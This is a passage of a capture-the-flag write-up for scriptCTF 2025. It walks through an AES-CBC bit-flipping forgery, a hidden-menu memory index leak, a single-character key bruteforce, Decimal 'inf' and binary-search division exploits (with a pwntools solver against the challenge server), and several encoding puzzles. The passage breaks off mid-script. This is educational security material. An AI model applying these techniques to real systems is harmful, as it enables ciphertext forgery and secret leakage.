</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>email</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>encrypted_pass</span> <span class=o>=</span> <span class=n>encrypt</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Please use this key for future login: &#34;</span> <span class=o>+</span> <span class=n>encrypted_pass</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>choice</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter your choice: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[1] Check for new messages</span><span class=se>\n</span><span class=s2>[2] Get flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>choice</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>has_flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;New email!</span><span class=se>\n</span><span class=s2>From: scriptsorcerers@script.sorcerer</span><span class=se>\n</span><span class=s2>Body: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No new emails!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>choice</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>sent</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sent</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=n>user_email_encrypted</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter encrypted email (in hex): &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>user_email_encrypted</span><span class=p>)</span> <span class=o>%</span> <span class=mi>16</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Email length needs to be a multiple of 16!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>user_email</span><span class=p>[</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span> <span class=o>!=</span> <span class=sa>b</span><span class=s2>&#34;@script.sorcerer&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;You are not part of ScriptSorcerers!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>send_email</span><span class=p>(</span><span class=n>user_email</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Email sent!&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>The server gives us a random email address every time we connect to it. Then it prompts us for a password in hex format. Server will encrypts our password using AES in CBC mode and outputs the ciphertext.
After that we have 2 choices, read our emails [1] or send an email [2]. On entering choice 1 we can read the flag if the <code>has_flag</code> variable is set to true. To set the <code>has_flag</code>, we have to send emails to an email address ending with <code>@script.sorcerer</code> and to our own email printed at the start comma separated and encrypted using AES. If the server was able to successfully decrypt the email, and it is in the above mentioned format, then the <code>has_flag</code> will be set, and we can read the flag by entering choice 1.
We already have access to the encrypt function (when entering the password) that will give us the ciphertext for a chosen plaintext, but we can&rsquo;t just simply enter our desired plaintext because of these checks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>assert</span> <span class=sa>b</span><span class=s2>&#34;@script.sorcerer&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>password</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>email</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>password</span>
</span></span></code></pre></div><p>So we have to enter a slightly modified plaintext, then XOR a few selected bits and we will be able to modify the resulting plaintext value. It goes like this:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250819221345.webp></p><p>Our email in this case is: <code>mbddtlvtww@notscript.sorcerer</code>. Our goal is to produce a ciphertext for this plaintext: <code>mbddtlvtww@notscript.sorcerer,b@script.sorcerer</code>. Due to the assertions in the script, we have to modify at least 2 characters in this string for the program to accept it. I chose it to be the first and last character.
The modified string will be: <code>abddtlvtww@notscript.sorcerer,b@script.sorceres</code>. AES is a block cipher and it encrypts and decrypts block by block. So if we were to modify a specific bit in a ciphertext block, then the previous block will produce gibberish when decrypting. For example if we want to modify the last bit of the above string, which is <code>s</code>, then we have to change the last bit in the previous block, which in this case will be <code>b</code>. But in that case the block containing <code>b</code>, since we are modifying it, will decrypt into gibberish. So we have to adjust the padding, in order for it to decrypt to our desired plaintext value. So after proper padding the final string will be like this:
<code>aaaaaaaaaaaaaaaaa,abddtlvtww@notscript.sorcerer,aaaaaaaaaaaaaaab@script.sorceres</code></p><p><img src=/img/scriptctf-25/Pasted%20image%2020250819224317.webp></p><p>We have to modify the 3rd bit of the first block and last bit of the second last block. We will send this to the server and modify bits at these position in the ciphertext.</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250819223835.webp></p><p>We will now modify the received ciphertext:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=s2>&#34;...ciphertext...&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>enc</span><span class=p>[</span><span class=o>-</span><span class=mi>17</span><span class=p>]</span> <span class=o>^=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>xor</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;r&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>enc</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>   <span class=o>^=</span> <span class=nb>ord</span><span class=p>(</span><span class=n>xor</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;m&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>enc</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span></code></pre></div><p>We will send the modified ciphertext back to the server and chose option 1 to read the flag:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250819224811.webp></p><h2 id=pwn>Pwn</h2><h3 id=index-345>Index (345)</h3><blockquote><p>I literally hand you the flag, just exploit it already!</p></blockquote><p>The program first prints out a menu:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820083934.webp></p><p>It only shows 4 options, but there&rsquo;s one more hidden option which we can see in the disassembled code:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820084100.webp></p><p>It checks if the entered value is <code>0x537</code> or <code>1337</code> in base 10. If it is true then the code will read the contents of <code>flag.txt</code> and loads it into memory:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820084215.webp></p><p>The <code>read_data</code> function will ask us for an index and it will read the value in memory for that given index and prints it out. I tried some brute forcing and we can print out the flag when we enter the index 8:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820085107.webp></p><h2 id=reversing>Reversing</h2><h3 id=plastic-shield-350>Plastic Shield (350)</h3><blockquote><p>OPSec is useless unless you do it correctly.</p></blockquote><p>There&rsquo;s a hard coded AES encrypted ciphertext in the program. When you run it, it will ask us for a password and only select one character from the given password. It then derive an IV and key after running blake2b cipher on the selected password. If the password is right, then the program will decrypt the flag for us.
Since it only take one character as the password, we can simply bruteforce it to decrypt the flag:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820092359.webp></p><h2 id=misc>Misc</h2><h3 id=div-100>Div (100)</h3><blockquote><p>I love division</p></blockquote><p>The challenge generates a random secret value and divides it with a value we enter. If the answer is 0, then it will print out the flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>decimal</span>
</span></span><span class=line><span class=cl><span class=n>decimal</span><span class=o>.</span><span class=n>getcontext</span><span class=p>()</span><span class=o>.</span><span class=n>prec</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;Enter a number: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s1>&#39;e&#39;</span> <span class=ow>in</span> <span class=n>num</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Nice try...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>10</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Number too long...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fl_num</span> <span class=o>=</span> <span class=n>decimal</span><span class=o>.</span><span class=n>Decimal</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>div</span> <span class=o>=</span> <span class=n>secret</span> <span class=o>/</span> <span class=n>fl_num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>div</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Try again...&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>The script uses <code>decimal.Decimal</code> to convert the input into a number. Due to this, we can enter <code>inf</code>, which is used for representing infinity in python. When it tries to divide the secret value with <code>inf</code> it will produce 0 and we can read the flag</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820093332.webp></p><h3 id=emoji-100>emoji (100)</h3><blockquote><p>Emojis everywhere! Is it a joke? Or something is hiding behind it.</p></blockquote><p>The attachment contains some emojis.</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820093633.webp></p><p>Unicode character offset spans between <code>0x1F000</code> and <code>0x1FFFF</code>, <a href=https://en.wikibooks.org/wiki/Unicode/Character_reference/1F000-1FFFF>https://en.wikibooks.org/wiki/Unicode/Character_reference/1F000-1FFFF</a>. We can try to subtract an offset of <code>0x1F000</code> from every character to find the character that represents each emoji.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>decoded</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x1F000</span><span class=p>)</span> <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>decoded</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=/img/scriptctf-25/Pasted%20image%2020250820094233.webp></p><h3 id=subtract>Subtract</h3><blockquote><p>The image size is 500x500. You might want to remove some stuff&mldr; Note: Some may call it guessy!</p></blockquote><p>The attachment had a coordinates.txt file containing some coordinates in the format <code>(x, y)</code>:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820110753.webp></p><p>The challenge description says the image size is 500x500, so my initial intuition was to generate an image with all the points marked.</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820111148.webp></p><p>This doesn&rsquo;t work because all the points in the 500x500 area is marked atleast once:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820111321.webp></p><p>There are 250573 coordinates in the file, but there are only 250000 pixels in a 500x500 image. So the extra 573 pixels must be the one that represents the flag. We just need to generate a parity image from these coordinates:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>coords_path</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;coordinates.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>out_dir</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;./&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=n>coords_path</span><span class=o>.</span><span class=n>read_text</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># parse coordinates</span>
</span></span><span class=line><span class=cl><span class=n>found</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;\(\s*(\d+)\s*,\s*(\d+)\s*\)&#34;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>coords</span> <span class=o>=</span> <span class=p>[(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>y</span><span class=p>))</span> <span class=k>for</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=ow>in</span> <span class=n>found</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>coords</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>W</span><span class=p>,</span> <span class=n>H</span> <span class=o>=</span> <span class=mi>500</span><span class=p>,</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># frequency and top freq points</span>
</span></span><span class=line><span class=cl><span class=n>freq</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>(</span><span class=n>coords</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create parity image (odd visits black, even visits white) - may reveal strokes</span>
</span></span><span class=line><span class=cl><span class=n>par_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>W</span><span class=p>,</span> <span class=n>H</span><span class=p>),</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>par_pix</span> <span class=o>=</span> <span class=n>par_img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>freq</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>x</span> <span class=o>&lt;</span> <span class=n>W</span> <span class=ow>and</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>y</span> <span class=o>&lt;</span> <span class=n>H</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>par_pix</span><span class=p>[</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=k>else</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>par_path</span> <span class=o>=</span> <span class=n>out_dir</span> <span class=o>/</span> <span class=s2>&#34;parity.png&#34;</span>
</span></span><span class=line><span class=cl><span class=n>par_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>par_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Saved parity image to&#34;</span><span class=p>,</span> <span class=n>par_path</span><span class=p>)</span>
</span></span></code></pre></div><p>And there we have our flag:</p><p><img src=/img/scriptctf-25/Pasted%20image%2020250820111533.webp></p><h3 id=enchant233>Enchant(233)</h3><blockquote><p>I was playing minecraft, and found this strange enchantment on the enchantment table. Can you figure out what it is? Wrap the flag in scriptCTF{}</p></blockquote><p>The challenge had an encrypted text which was encrypted with letters found on the Enchantment table.
The encrypted text :-</p><pre tabindex=0><code>  
</code></pre><p>After some googling found out these are <a href=https://keenwiki.shikadi.net/wiki/Standard_Galactic_Alphabet>Standard Galatic Alphabet</a>
Decoded the text with the help of the chart and found the flag.</p><p><img src=/img/scriptctf-25/enchant_flag.webp></p><h3 id=div-2324>Div 2(324)</h3><blockquote><p>Some might call this a programming challenge&mldr;</p></blockquote><p>The challenge provided a <code>chall.py</code>. Let&rsquo;s examine that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>secrets</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>decimal</span>
</span></span><span class=line><span class=cl><span class=n>decimal</span><span class=o>.</span><span class=n>getcontext</span><span class=p>()</span><span class=o>.</span><span class=n>prec</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl><span class=n>secret</span> <span class=o>=</span>  <span class=n>secrets</span><span class=o>.</span><span class=n>randbelow</span><span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>127</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>127</span><span class=p>)</span> <span class=c1># Choose a 128 bit number</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[1] Provide a number</span><span class=se>\n</span><span class=s2>[2] Guess the secret number&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>choice</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Choice: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>choice</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;Enter a number: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>fl_num</span> <span class=o>=</span> <span class=n>decimal</span><span class=o>.</span><span class=n>Decimal</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=nb>int</span><span class=p>(</span><span class=n>fl_num</span><span class=p>)</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>==</span> <span class=n>secret</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>div</span> <span class=o>=</span> <span class=n>secret</span> <span class=o>/</span> <span class=n>fl_num</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>div</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>choice</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>guess</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter secret number: &#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>guess</span> <span class=o>==</span> <span class=n>secret</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Incorrect!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><p>By looking at the code, vulnerability lies in the fact that it performs high-precision division and then reveals the truncated integer result, which leaks enough information to uncover the secret number bit by bit.</p><p>Math behind the exploit:-</p><p>Let the secret number be <code>S</code>. Let the input be <code>N</code>. The script calculates <code>D = S/N</code> with high precision and then gives you back <code>I = int(D)</code>, which is equivalent to <code>S/N</code> (the floor of the division). This tells you that:</p><p><code>I  NS &lt; I+1</code></p><p>By multiplying by <code>N</code> , constrain the possible range of <code>S</code>:</p><p><code>IN  S &lt; (I+1)N</code></p><p>Since we know the initial range of <code>S</code> is <code>[2127, 21281]</code>, we can use this repeatedly to shrink the possible range for <code>S</code> until it&rsquo;s just one number</p><p>now the python script to exploit</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- Connection Setup ---</span>
</span></span><span class=line><span class=cl><span class=c1># Choose how to connect to the challenge</span>
</span></span><span class=line><span class=cl><span class=c1># To run the script locally:</span>
</span></span><span class=line><span class=cl><span class=c1># p = process([&#39;python3&#39;, &#39;challenge.py&#39;]) # Make sure to name the challenge file &#39;challenge.py&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># To connect to a remote server (uncomment the line below and fill in the details):</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;play.scriptsorcerers.xyz&#39;</span><span class=p>,</span> <span class=mi>10354</span><span class=p>)</span> <span class=c1># host and port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- The Attack Logic ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Initial range for the 128-bit secret number</span>
</span></span><span class=line><span class=cl><span class=n>lower_bound</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl><span class=n>upper_bound</span> <span class=o>=</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>128</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Initial Range size: </span><span class=si>{</span><span class=p>(</span><span class=n>upper_bound</span> <span class=o>-</span> <span class=n>lower_bound</span><span class=p>)</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span><span class=si>}</span><span class=s2> bits&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create a progress logger to see the convergence in real-time</span>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Finding the secret&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>lower_bound</span> <span class=o>&lt;</span> <span class=n>upper_bound</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Update the progress bar</span>
</span></span><span class=line><span class=cl>    <span class=n>range_bits</span> <span class=o>=</span> <span class=p>(</span><span class=n>upper_bound</span> <span class=o>-</span> <span class=n>lower_bound</span><span class=p>)</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>prog</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Range size: </span><span class=si>{</span><span class=n>range_bits</span><span class=si>}</span><span class=s2> bits&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Choose the midpoint of the current range as our query number.</span>
</span></span><span class=line><span class=cl>    <span class=c1># This satisfies the 128-bit length assert in the challenge.</span>
</span></span><span class=line><span class=cl>    <span class=n>num_to_send</span> <span class=o>=</span> <span class=p>(</span><span class=n>lower_bound</span> <span class=o>+</span> <span class=n>upper_bound</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Option 1: Provide a number</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Choice: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter a number: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>num_to_send</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Receive the quotient &#39;q&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
